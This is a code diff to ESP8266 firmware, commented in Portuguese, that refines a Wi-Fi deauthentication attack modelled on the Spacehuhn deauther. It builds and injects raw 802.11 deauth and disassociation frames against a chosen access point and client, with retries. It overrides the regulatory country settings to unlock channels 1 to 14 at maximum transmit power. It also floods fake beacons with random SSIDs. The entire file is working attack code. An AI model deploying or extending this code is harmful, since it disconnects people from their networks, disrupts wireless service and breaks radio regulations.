@@ -1,4 +1,11 @@
+/*
+ * Deauth: logica alinhada a Spacehuhn esp8266_deauther v2 (Attack.cpp / Attack.h).
+ * Licenca MIT: https://github.com/SpacehuhnTech/esp8266_deauther
+ */
+
 #include "deauther.h"
+
+#include <cstring>
 
 #include <ESP8266WiFi.h>
 #include "app_state.h"
@@ -11,143 +18,239 @@ extern "C"
 
 bool deautherRunning = false;
 unsigned long deautherPacketsSent = 0;
+unsigned long deautherInjectFail = 0;
 bool beaconActive = false;
 unsigned long beaconPacketsSent = 0;
 
-// Variáveis de controle do ataque
 static bool attackActive = false;
 static uint8_t targetApMac[6];
 static uint8_t targetClientMac[6];
 static uint8_t targetChannel = 1;
 static uint8_t attackReason = 7;
 static unsigned long lastAttackPacketAt = 0;
+static unsigned long lastBeaconTickAt = 0;
 
-/** Intensidade: mais bursts por rajada e periodo mais curto = mais pacotes/s (limitado pelo radio). */
-static constexpr int kDeauthBurst = 28;
-static constexpr unsigned long kDeauthPeriodMs = 10;
+/** Igual a A_config.h padrao do Spacehuhn v2 (DEAUTHS_PER_TARGET 25). */
+static constexpr uint8_t kDeauthsPerSecond = 25;
+static constexpr unsigned long kDeauthPeriodMs =
+    (kDeauthsPerSecond > 0) ? (1000UL / kDeauthsPerSecond) : 40UL;
 
-// Pacote melhorado (mais compatível)
-static uint8_t deauthPacket[26] = {
-    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
-    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
-    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
-    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
-};
+/** Cache de canal como functions.h:setWifiChannel no Spacehuhn. */
+static uint8_t s_wifiChannelCache = 255;
 
-static uint8_t beaconPacket[128] = {
-    /*  0 - 1  */ 0x80, 0x00,                                                                                                             // Type: Beacon
-    /*  2 - 3  */ 0x00, 0x00,                                                                                                             // Duration
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                                                                                     // Destination: Broadcast
-    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,                                                                                     // Source: Random
-    /* 16 - 21 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,                                                                                     // BSSID: Random
-    /* 22 - 23 */ 0x00, 0x00,                                                                                                             // Sequence
-    /* 24 - 31 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                                                                         // Timestamp
-    /* 32 - 33 */ 0x64, 0x00,                                                                                                             // Beacon interval: 100ms
-    /* 34 - 35 */ 0x01, 0x04,                                                                                                             // Capability info
-    /* 36 - 37 */ 0x00, 0x06,                                                                                                             // SSID tag
-    /* 38 - 43 */ 'F', 'A', 'K', 'E', 'A', 'P',                                                                                           // SSID
-    /* 44 - 45 */ 0x01, 0x08,                                                                                                             // Supported rates tag
-    /* 46 - 53 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,                                                                         // Rates
-    /* 54 - 55 */ 0x03, 0x01,                                                                                                             // DS parameter set
-    /* 56      */ 0x01,                                                                                                                   // Channel
-    /* 57 - 58 */ 0x05, 0x04,                                                                                                             // TIM tag
-    /* 59 - 62 */ 0x00, 0x01, 0x00, 0x00,                                                                                                 // TIM
-    /* 63 - 64 */ 0x2a, 0x01,                                                                                                             // ERP tag
-    /* 65      */ 0x00,                                                                                                                   // ERP
-    /* 66 - 67 */ 0x2f, 0x01,                                                                                                             // HT capabilities tag
-    /* 68 - 83 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // HT
-    /* 84 - 85 */ 0x3d, 0x01,                                                                                                             // HT information tag
-    /* 86 - 87 */ 0x00, 0x00,                                                                                                             // HT info
-    /* 88 - 89 */ 0x4a, 0x0e,                                                                                                             // RSN tag
-    /* 90 - 108 */ 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00 // RSN
-};
+static void setWifiChannelSh(uint8_t ch, bool force)
+{
+  if ((((ch != s_wifiChannelCache) || force) && (ch < 15)) && ch >= 1)
+  {
+    s_wifiChannelCache = ch;
+    wifi_set_channel(ch);
+  }
+}
 
-/** wifi_send_pkt_freedom exige STATION_MODE, sem SoftAP; promiscuo costuma atrapalhar o envio. */
+/** Com STA desligado, politica AUTO pode limitar canais e bloquear wifi_send_pkt_freedom. */
+static void applyInjectionCountry()
+{
+  wifi_country_t c;
+  memset(&c, 0, sizeof(c));
+  strncpy(c.cc, "01", 3);
+  c.schan = 1;
+  c.nchan = 14;
+  c.policy = WIFI_COUNTRY_POLICY_MANUAL;
+  wifi_set_country(&c);
+}
+
+void restoreWifiRegAfterInjection()
+{
+  wifi_country_t c;
+  memset(&c, 0, sizeof(c));
+  strncpy(c.cc, "CN", 3);
+  c.schan = 1;
+  c.nchan = 13;
+  c.policy = WIFI_COUNTRY_POLICY_AUTO;
+  wifi_set_country(&c);
+}
+
+static bool sendRawPacket(uint8_t *packet, uint16_t packetSize, uint8_t ch)
+{
+  setWifiChannelSh(ch, true);
+  yield();
+  int r = wifi_send_pkt_freedom(packet, packetSize, 0);
+  if (r != 0)
+  {
+    delayMicroseconds(800);
+    r = wifi_send_pkt_freedom(packet, packetSize, 1);
+  }
+  if (r != 0)
+  {
+    delay(1);
+    r = wifi_send_pkt_freedom(packet, packetSize, 0);
+  }
+  const bool sent = (r == 0);
+  if (sent)
+  {
+    deautherPacketsSent++;
+  }
+  else
+  {
+    deautherInjectFail++;
+  }
+  return sent;
+}
+
+static bool macBroadcast(const uint8_t *mac)
+{
+  static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  return memcmp(mac, bcast, 6) == 0;
+}
+
+/* Template 26 bytes — Attack.h (Spacehuhn v2). */
+static const uint8_t kDeauthTemplate[26] = {
+    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00, 0x01, 0x00};
+
+/**
+ * Attack::deauthDevice — copia fiel (ordem de frames e BSSID no sentido STA->AP).
+ */
+static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
+{
+  if (!stMac)
+  {
+    return false;
+  }
+
+  bool success = false;
+  constexpr uint16_t packetSize = 26;
+
+  uint8_t deauthpkt[packetSize];
+  memcpy(deauthpkt, kDeauthTemplate, packetSize);
+  memcpy(&deauthpkt[4], stMac, 6);
+  memcpy(&deauthpkt[10], apMac, 6);
+  memcpy(&deauthpkt[16], apMac, 6);
+  deauthpkt[24] = reason;
+
+  deauthpkt[0] = 0xc0;
+  if (sendRawPacket(deauthpkt, packetSize, ch))
+  {
+    success = true;
+  }
+  delayMicroseconds(350);
+
+  uint8_t disassocpkt[packetSize];
+  memcpy(disassocpkt, deauthpkt, packetSize);
+  disassocpkt[0] = 0xa0;
+  if (sendRawPacket(disassocpkt, packetSize, ch))
+  {
+    success = true;
+  }
+  delayMicroseconds(350);
+
+  if (!macBroadcast(stMac))
+  {
+    memcpy(&disassocpkt[4], apMac, 6);
+    memcpy(&disassocpkt[10], stMac, 6);
+    memcpy(&disassocpkt[16], stMac, 6);
+
+    disassocpkt[0] = 0xc0;
+    if (sendRawPacket(disassocpkt, packetSize, ch))
+    {
+      success = true;
+    }
+    delayMicroseconds(350);
+
+    disassocpkt[0] = 0xa0;
+    if (sendRawPacket(disassocpkt, packetSize, ch))
+    {
+      success = true;
+    }
+  }
+
+  return success;
+}
+
+/** wifi::stopAP + STATION — esp8266_deauther wifi.cpp + API Arduino (stack sincronizado). */
 static void prepareRadioForDeauthInjection(uint8_t channel)
 {
   wifi_promiscuous_enable(0);
+  WiFi.persistent(false);
+  WiFi.setAutoReconnect(false);
+  WiFi.setSleepMode(WIFI_NONE_SLEEP);
+
   WiFi.softAPdisconnect(true);
-  delay(50);
-  wifi_set_opmode(STATION_MODE);
-  delay(50);
-  WiFi.disconnect(true);
   delay(150);
-  wifi_set_channel(channel);
+
+  WiFi.mode(WIFI_STA);
+  delay(100);
+
+  WiFi.disconnect(true);
+  wifi_station_disconnect();
+  delay(150);
+
+  wifi_set_opmode(STATION_MODE);
+  wifi_set_phy_mode(PHY_MODE_11N);
+  system_phy_set_max_tpw(82);
+
+  applyInjectionCountry();
+
+  s_wifiChannelCache = 255;
+  if (channel >= 1 && channel <= 14)
+  {
+    wifi_set_channel(channel);
+    s_wifiChannelCache = channel;
+  }
+  delay(100);
 }
 
 void initDeauther()
 {
-  /* Radio e preparado em prepareRadioForDeauthInjection ao iniciar o ataque. */
 }
 
-uint8_t *parseMac(String macStr)
+static bool parseMacString(const String &macStr, uint8_t out[6])
 {
-  static uint8_t mac[6];
-  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
-  return mac;
-}
-
-static void sendDeauthBurst(uint8_t subtype)
-{
-  deauthPacket[0] = subtype;
-  for (int i = 0; i < kDeauthBurst; i++)
+  String s = macStr;
+  s.trim();
+  s.replace(":", "");
+  s.replace("-", "");
+  s.toUpperCase();
+  if (s.length() != 12)
   {
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    if ((i & 0xF) == 0xF)
+    return false;
+  }
+  for (int i = 0; i < 6; i++)
+  {
+    const String octet = s.substring(i * 2, i * 2 + 2);
+    char *end = nullptr;
+    const unsigned long v = strtoul(octet.c_str(), &end, 16);
+    if (end == octet.c_str() || v > 255)
     {
-      yield();
+      return false;
     }
+    out[i] = static_cast<uint8_t>(v);
   }
+  return true;
 }
 
-void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
-{
-  wifi_set_channel(channel);
-  delay(1);
-
-  memcpy(&deauthPacket[4], clientMac, 6);
-  memcpy(&deauthPacket[10], apMac, 6);
-  memcpy(&deauthPacket[16], apMac, 6);
-  deauthPacket[24] = reason;
-
-  sendDeauthBurst(0xC0);
-  sendDeauthBurst(0xA0);
-
-  if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
-  {
-    memcpy(&deauthPacket[4], apMac, 6);
-    memcpy(&deauthPacket[10], clientMac, 6);
-    memcpy(&deauthPacket[16], apMac, 6);
-  }
-  else
-  {
-    memcpy(&deauthPacket[4], apMac, 6);
-    memcpy(&deauthPacket[10], clientMac, 6);
-    memcpy(&deauthPacket[16], apMac, 6);
-  }
-
-  sendDeauthBurst(0xC0);
-  sendDeauthBurst(0xA0);
-
-  deautherPacketsSent += static_cast<unsigned long>(4 * kDeauthBurst);
-}
+static uint8_t beaconPacket[128] = {
+    0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04, 0x00, 0x06, 'F', 'A', 'K', 'E', 'A', 'P',
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01, 0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
+    0x2a, 0x01, 0x00, 0x2f, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x3d, 0x01, 0x00, 0x00, 0x4a, 0x0e, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00};
 
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
 {
+  deautherPacketsSent = 0;
+  deautherInjectFail = 0;
+
   memcpy(targetApMac, apMac, 6);
   memcpy(targetClientMac, clientMac, 6);
   targetChannel = channel;
   attackReason = reason;
   attackActive = true;
   deautherRunning = true;
-  lastAttackPacketAt = millis();
+  lastAttackPacketAt = millis() - kDeauthPeriodMs;
 
   prepareRadioForDeauthInjection(channel);
-
-  sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
 }
 
 void stopDeauthAttack()
@@ -155,58 +258,61 @@ void stopDeauthAttack()
   attackActive = false;
   deautherRunning = false;
 
+  Serial.print(F("[deauther] OK="));
+  Serial.print(deautherPacketsSent);
+  Serial.print(F(" falha="));
+  Serial.println(deautherInjectFail);
+
   restorePortalWiFiAfterDeauth();
 }
 
 void startBeaconAttack()
 {
   prepareRadioForDeauthInjection(1);
-
+  lastBeaconTickAt = millis() - kDeauthPeriodMs;
   beaconActive = true;
 }
 
 void stopBeaconAttack()
 {
   beaconActive = false;
-
   restorePortalWiFiAfterDeauth();
 }
 
 void updateBeacon()
 {
-  if (beaconActive && (millis() - lastAttackPacketAt > kDeauthPeriodMs))
+  if (beaconActive && (millis() - lastBeaconTickAt >= kDeauthPeriodMs))
   {
     for (int i = 0; i < 10; i++)
     {
-      // Generate random MAC
       uint8_t mac[6];
       for (int j = 0; j < 6; j++)
+      {
         mac[j] = random(256);
-
-      // Set MAC in packet
+      }
       memcpy(&beaconPacket[10], mac, 6);
       memcpy(&beaconPacket[16], mac, 6);
+      beaconPacket[56] = random(1, 12);
 
-      // Set channel
-      beaconPacket[56] = random(1, 12); // Random channel
-
-      // Generate random SSID
       String prefixes[5] = {"FREE", "HOTSPOT", "WIFI", "NET", "LAN"};
       String ssid = prefixes[random(5)] + String(random(9999));
       int len = ssid.length();
-      beaconPacket[37] = len;
+      if (len > 32)
+      {
+        len = 32;
+      }
+      beaconPacket[37] = static_cast<uint8_t>(len);
       for (int j = 0; j < len; j++)
       {
         beaconPacket[38 + j] = ssid[j];
       }
 
-      wifi_set_channel(beaconPacket[56]);
+      setWifiChannelSh(beaconPacket[56], true);
       delay(1);
-
       wifi_send_pkt_freedom(beaconPacket, 109, 0);
       beaconPacketsSent++;
     }
-    lastAttackPacketAt = millis();
+    lastBeaconTickAt = millis();
   }
 }
 
@@ -219,7 +325,7 @@ void updateDeauth()
 {
   if (attackActive && (millis() - lastAttackPacketAt >= kDeauthPeriodMs))
   {
-    sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
+    deauthDeviceSpacehuhn(targetApMac, targetClientMac, attackReason, targetChannel);
     lastAttackPacketAt = millis();
   }
 }
@@ -233,15 +339,20 @@ void toggleDeauther()
   }
   else
   {
-    uint8_t *apMac = parseMac(deautherApMac);
-    uint8_t *clientMac = parseMac(deautherClientMac);
-    Serial.print("Starting deauther with AP MAC: ");
+    uint8_t apMac[6];
+    uint8_t clientMac[6];
+    if (!parseMacString(deautherApMac, apMac) || !parseMacString(deautherClientMac, clientMac))
+    {
+      Serial.println(F("[deauther] MAC invalido (use 12 hex, ex: aa:bb:cc:dd:ee:ff)"));
+      return;
+    }
+    Serial.print(F("Starting deauther (Spacehuhn v2 logic) AP MAC: "));
     Serial.print(deautherApMac);
-    Serial.print(", Client MAC: ");
+    Serial.print(F(", Client MAC: "));
     Serial.print(deautherClientMac);
-    Serial.print(", Channel: ");
+    Serial.print(F(", Channel: "));
     Serial.println(deautherChannel);
-    startDeauthAttack(apMac, clientMac, deautherChannel, 1);
+    startDeauthAttack(apMac, clientMac, static_cast<uint8_t>(deautherChannel), 1);
     Serial.println("Deauther started");
   }
 }
